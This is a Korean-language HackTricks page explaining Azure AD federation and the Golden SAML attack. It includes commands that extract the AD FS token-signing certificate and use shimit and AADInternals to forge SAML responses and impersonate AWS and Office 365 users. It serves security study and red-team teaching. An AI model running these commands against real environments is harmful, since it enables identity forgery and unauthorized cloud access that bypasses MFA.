# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 가입하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)을 팔로우하세요.**
* **PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 해킹 트릭을 공유하세요.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation**은 **신뢰**를 구축한 **도메인**의 모음입니다. 신뢰 수준은 다양할 수 있지만, 일반적으로 **인증**을 포함하며 거의 항상 **권한 부여**를 포함합니다. 일반적인 페더레이션은 **리소스**에 대한 **공유 액세스**를 위해 **신뢰**를 구축한 **여러 조직**을 포함할 수 있습니다.

**Azure AD**와 **온프레미스 환경**을 페더레이션하여 인증 및 권한 부여에 사용할 수 있습니다. 이 로그인 방법은 모든 사용자 **인증이 온프레미스에서 발생**하도록 보장합니다. 이 방법을 통해 관리자는 더 엄격한 수준의 액세스 제어를 구현할 수 있습니다. **AD FS** 및 PingFederate와의 페더레이션이 가능합니다.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

기본적으로, 페더레이션에서는 모든 **인증**이 **온프레미스** 환경에서 발생하며 사용자는 모든 신뢰된 환경에서 SSO를 경험합니다. 따라서 사용자는 **온프레미스 자격 증명**을 사용하여 **클라우드** 애플리케이션에 **액세스**할 수 있습니다.

**Security Assertion Markup Language (SAML)**은 공급자 간에 모든 인증 및 권한 부여 **정보**를 **교환**하는 데 사용됩니다.

어떤 페더레이션 설정에서도 세 가지 당사자가 있습니다:

* 사용자 또는 클라이언트
* Identity Provider (IdP)
* Service Provider (SP)

(이미지 출처: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. 처음에 사용자는 애플리케이션(예: AWS 콘솔 또는 vSphere 웹 클라이언트)에 접근합니다. 이 단계는 특정 구현에 따라 클라이언트를 직접 IdP(Identity Provider)로 리디렉션할 수 있습니다.
2. 이후 SP는 사용자 인증을 위해 적절한 IdP(예: AD FS, Okta)를 식별합니다. 그런 다음 SAML(AuthnRequest)을 작성하고 클라이언트를 선택한 IdP로 리디렉션합니다.
3. IdP는 사용자를 인증합니다. 인증 후, IdP는 SAMLResponse를 작성하여 사용자를 통해 SP로 전달합니다.
4. 마지막으로 SP는 SAMLResponse를 평가합니다. 신뢰할 수 있는 IdP에서 발행된 것으로 확인되면 사용자는 액세스 권한을 부여받습니다. 이로써 로그인 프로세스가 완료되고 사용자는 서비스를 이용할 수 있습니다.

**SAML 인증 및 일반적인 공격에 대해 더 알고 싶다면:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS는 클레임 기반의 아이덴티티 모델입니다.
* "..클레임은 주로 인터넷 어디에나 위치한 클레임 기반 애플리케이션에 대한 액세스를 승인하는 데 사용되는 사용자에 대한 진술(예: 이름, 아이덴티티, 그룹)입니다."
* 사용자의 클레임은 SAML 토큰에 작성되며 IdP에 의해 기밀성을 제공하기 위해 서명됩니다.
* 사용자는 ImmutableID로 식별됩니다. 이는 전역적으로 고유하며 Azure AD에 저장됩니다.
* ImmutableID는 온프레미스에서 ms-DS-ConsistencyGuid로 저장되며 사용자의 GUID에서 파생될 수 있습니다.
* 자세한 정보는 [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)에서 확인하세요.

**Golden SAML 공격:**

* ADFS에서 SAML Response는 토큰 서명 인증서로 서명됩니다.
* 인증서가 손상되면 Azure AD에 동기화된 모든 사용자로 인증할 수 있습니다!
* PTA 남용과 마찬가지로 사용자의 비밀번호 변경이나 MFA는 아무런 영향을 미치지 않습니다. 우리는 인증 응답을 위조하고 있기 때문입니다.
* 인증서는 DA 권한으로 AD FS 서버에서 추출할 수 있으며, 인터넷에 연결된 어떤 기기에서도 사용할 수 있습니다.
* 자세한 정보는 [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)에서 확인하세요.

### Golden SAML

**Identity Provider (IdP)**가 사용자 로그인 승인을 위해 **SAMLResponse**를 생성하는 과정은 매우 중요합니다. IdP의 특정 구현에 따라 **응답**은 **IdP의 개인 키**를 사용하여 **서명**되거나 **암호화**될 수 있습니다. 이 절차는 **Service Provider (SP)**가 SAMLResponse의 진위를 확인하여 신뢰할 수 있는 IdP에서 발행되었음을 보장합니다.

[golden ticket 공격](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket)과 유사하게, 사용자의 아이덴티티와 권한을 인증하는 키(KRBTGT는 golden ticket, token-signing 개인 키는 golden SAML)를 조작하여 **인증 객체**(TGT 또는 SAMLResponse)를 **위조**할 수 있습니다. 이를 통해 사용자를 가장하여 SP에 무단 액세스를 할 수 있습니다.

Golden SAML은 다음과 같은 장점을 제공합니다:

* **원격으로 생성**할 수 있으며, 해당 도메인이나 페더레이션의 일부일 필요가 없습니다.
* **이중 인증(2FA)**이 활성화된 상태에서도 유효합니다.
* 토큰 서명 **개인 키는 자동으로 갱신되지 않습니다**.
* **사용자의 비밀번호를 변경해도** 이미 생성된 SAML은 무효화되지 않습니다.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\))는 신뢰할 수 있는 비즈니스 파트너(페더레이션) 간에 **아이덴티티 정보를 안전하게 교환**할 수 있도록 하는 Microsoft 서비스입니다. 이는 도메인 서비스가 페더레이션 내의 다른 서비스 제공자와 사용자 아이덴티티를 공유할 수 있도록 합니다.

AWS가 손상된 도메인을 신뢰하는 경우(페더레이션 내에서), 이 취약점을 악용하여 AWS 환경에서 **모든 권한을 획득**할 수 있습니다. 이 공격은 SAML 객체를 서명하는 데 사용되는 **개인 키**가 필요하며, 이는 golden ticket 공격에서 KRBTGT가 필요한 것과 유사합니다. AD FS 사용자 계정에 대한 액세스만으로 이 개인 키를 얻을 수 있습니다.

Golden SAML 공격을 실행하기 위한 요구 사항은 다음과 같습니다:

* **토큰 서명 개인 키**
* **IdP 공개 인증서**
* **IdP 이름**
* **역할 이름(가정할 역할)**
* 도메인\사용자 이름
* AWS에서의 역할 세션 이름
* Amazon 계정 ID

_굵게 표시된 항목만 필수입니다. 나머지는 원하는 대로 채울 수 있습니다._

**개인 키**를 얻으려면 **AD FS 사용자 계정**에 대한 액세스가 필요합니다. 거기서 개인 키는 [mimikatz](https://github.com/gentilkiwi/mimikatz)와 같은 도구를 사용하여 **개인 저장소에서 내보낼 수 있습니다**. 다른 필요한 정보를 수집하려면 ADFS 사용자로 로그인한 상태에서 Microsoft.Adfs.Powershell 스냅인을 사용할 수 있습니다:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
모든 정보를 통해, [**shimit**](https://github.com/cyberark/shimit)**을 사용하여 원하는 사용자의 유효한 SAMLResponse를 잊어버릴 수 있습니다:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### 온프레미스 -> 클라우드
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
클라우드 전용 사용자의 ImmutableID를 생성하고 이를 가장하는 것도 가능합니다.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## 참고 자료

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking 배우기 및 연습하기:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking 배우기 및 연습하기: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 플랜**](https://github.com/sponsors/carlospolop)을 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 가입하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)을 팔로우하세요.
* PR을 제출하여 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 해킹 트릭을 공유하세요.

</details>
{% endhint %}
